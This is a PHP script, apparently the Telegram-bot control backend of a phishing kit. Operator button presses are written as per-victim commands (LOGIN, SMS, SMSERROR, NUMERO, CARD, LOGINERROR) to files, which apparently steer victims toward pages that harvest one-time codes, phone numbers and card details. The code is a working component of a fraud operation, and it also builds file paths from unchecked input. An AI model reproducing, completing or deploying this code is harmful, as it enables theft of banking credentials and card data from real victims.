<?php
include("settings.php");

$content = file_get_contents("php://input");
$update = json_decode($content, true);

if (isset($update['callback_query'])) {
    $data = $update['callback_query']['data'];
    $callback_id = $update['callback_query']['id'];

    if (!file_exists("acciones")) {
        mkdir("acciones", 0777, true);
    }

    // Formato LOGINERROR|usuario|dispositivo
    if (substr_count($data, '|') === 2) {
        list($comando, $usuario, $dispositivo) = explode('|', $data);
        file_put_contents("acciones/$usuario.txt", "$comando|$usuario|$dispositivo");
    }

    // Formato COMANDO|usuario
    elseif (substr_count($data, '|') === 1) {
        list($comando, $usuario) = explode('|', $data);
        $archivo = "acciones/$usuario.txt";

        switch ($comando) {
            case "SMS":
                file_put_contents($archivo, "/SMS");
                break;
            case "SMS2":
                file_put_contents($archivo, "/SMS2");
                break;
            case "LOGIN":
                file_put_contents($archivo, "/LOGIN");
                break;
            case "SMSERROR":
                file_put_contents($archivo, "/SMSERROR");
                break;
            case "NUMERO":
                file_put_contents($archivo, "/NUMERO");
                break;
            case "CARD":
                file_put_contents($archivo, "/CARD");
                break;
            default:
                file_put_contents($archivo, "/ERROR");
                break;
        }
    }

    // Confirmación al botón
    file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?" . http_build_query([
        'callback_query_id' => $callback_id,
        'text' => "✅ Acción registrada",
        'show_alert' => false
    ]));
}
?>
